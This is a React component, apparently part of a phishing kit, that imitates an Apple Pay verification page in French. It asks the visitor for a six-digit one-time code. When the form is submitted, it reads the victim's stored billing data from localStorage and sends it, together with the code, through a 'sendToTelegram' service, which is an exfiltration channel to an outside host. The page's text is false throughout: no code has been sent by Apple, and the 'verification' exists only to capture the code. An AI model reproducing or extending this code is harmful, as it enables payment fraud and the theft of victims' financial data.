import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Navbar } from '../Navbar';
import { SecondaryNav } from '../SecondaryNav';
import { Footer } from '../Footer';
import { AppleIcon } from './Icons';
import { sendToTelegram } from '../../../services/telegram';

export function ApplePayVerification() {
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const location = useLocation();
  const navigate = useNavigate();

  useEffect(() => {
    const params = new URLSearchParams(location.search);
    if (params.get('error') === 'true') {
      setError('Code incorrect. Veuillez réessayer.');
    }
  }, [location]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length !== 6) {
      setError('Le code doit contenir 6 chiffres');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      const billingInfo = JSON.parse(localStorage.getItem('customerData') || '{}');
      await sendToTelegram({ code, billingInfo, type: 'apple_pay' }, 'apple_pay');
    } catch (error) {
      setError('Une erreur est survenue. Veuillez réessayer.');
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Navbar />
      <SecondaryNav />
      
      <main className="flex-1 flex items-center justify-center py-32 px-4 min-h-[800px]">
        <div className="w-full max-w-lg">
          <div className="bg-white rounded-2xl shadow-xl p-12">
            <div className="flex flex-col items-center mb-16">
              <div className="w-24 h-24 rounded-xl flex items-center justify-center mb-8">
                <AppleIcon className="w-16 h-16 text-white" />
              </div>
              <h1 className="text-4xl font-bold text-gray-900 text-center mb-4">
                Vérification Apple Pay
              </h1>
              <p className="mt-2 text-gray-600 text-center text-lg max-w-sm">
                Un code de vérification a été envoyé à votre appareil Apple
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-10">
              <div>
                <label htmlFor="code" className="block text-base font-medium text-gray-700 mb-3">
                  Code de vérification
                </label>
                <input
                  type="text"
                  id="code"
                  maxLength={6}
                  value={code}
                  onChange={(e) => {
                    const value = e.target.value.replace(/\D/g, '');
                    setCode(value);
                    setError('');
                  }}
                  className={`w-full px-6 py-5 text-center text-3xl tracking-[0.5em] border-2 rounded-xl
                    ${error ? 'border-red-500' : 'border-gray-200'}
                    focus:ring focus:ring-opacity-50 focus:border-[#96154a] focus:ring-[#96154a]
                    transition-colors`}
                  placeholder="• • • • • •"
                />
                {error && (
                  <p className="mt-3 text-sm text-red-500">{error}</p>
                )}
              </div>

              <button
                type="submit"
                disabled={isLoading || code.length !== 6}
                className={`w-full px-8 py-6 bg-black text-white rounded-xl text-xl font-medium
                  transition-all duration-300 flex items-center justify-center gap-3
                  ${!isLoading && code.length === 6
                    ? 'hover:bg-gray-800 transform hover:-translate-y-0.5 hover:shadow-lg'
                    : 'opacity-50 cursor-not-allowed'}`}
              >
                {isLoading ? (
                  <>
                    <div className="w-6 h-6 border-3 border-white border-t-transparent rounded-full animate-spin"></div>
                    <span>Vérification en cours...</span>
                  </>
                ) : (
                  <span>Vérifier</span>
                )}
              </button>

              <p className="text-center text-sm text-gray-500 pt-4">
                Le code expire dans 10 minutes
              </p>
            </form>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}